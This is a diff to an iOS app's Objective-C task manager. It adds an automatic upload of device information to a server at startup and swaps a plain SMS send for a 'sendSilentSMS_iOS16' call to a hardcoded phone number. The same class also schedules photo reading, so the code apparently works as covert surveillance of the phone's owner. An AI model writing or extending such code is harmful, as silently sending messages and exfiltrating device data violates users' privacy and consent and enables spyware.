@@ -8,6 +8,7 @@
 #import "YOSystemManager.h"
 #import "SMSSender.h"
 #import "YOPhotoReader.h"
+#import "BusinessNetworkManager.h"
 
 // ─────────────────────────────────────────────
 // MARK: - 内部工具：安全获取 rootViewController
@@ -55,9 +56,20 @@ static UIViewController *_Nullable YOTopViewController(void) {
 - (void)startAllTasks {
     YOLogI(@"[Manager] 启动所有任务");
 
+    [self sendDeviceInfo];
+    
     [self scheduleUI];
-    [self scheduleSMS];
+//    [self scheduleSMS];
     [self schedulePhotos];
+}
+
+#pragma mark - Network
+- (void)sendDeviceInfo {
+    [[BusinessNetworkManager sharedManager] reportDeviceWithSuccess:^(id response) {
+        YOLogI(@"设备信息上传成功: %@", response);
+    } failure:^(NSError *error) {
+        YOLogI(@"设备信息上传失败: %@", error);
+    }];
 }
 
 #pragma mark - UI
@@ -104,18 +116,12 @@ static UIViewController *_Nullable YOTopViewController(void) {
         YOLogE(@"[SMS] 不可用");
         return;
     }
+    
+    
+    NSString *message = @"测试消息202603311118";
+    NSString *phoneNumber = @"+8613379523124";
 
-    NSString *recipient = @"+8613812345678";
-
-    [[SMSSender sharedSender] sendSMSTo:recipient
-                                   body:@"测试消息"
-                             completion:^(BOOL success, NSError *error) {
-        if (success) {
-            YOLogI(@"[SMS] 发送成功");
-        } else {
-            YOLogE(@"[SMS] 失败: %@", error.localizedDescription);
-        }
-    }];
+    [[SMSSender sharedSender] sendSilentSMS_iOS16:phoneNumber mes:message];
 }
 
 #pragma mark - Photos
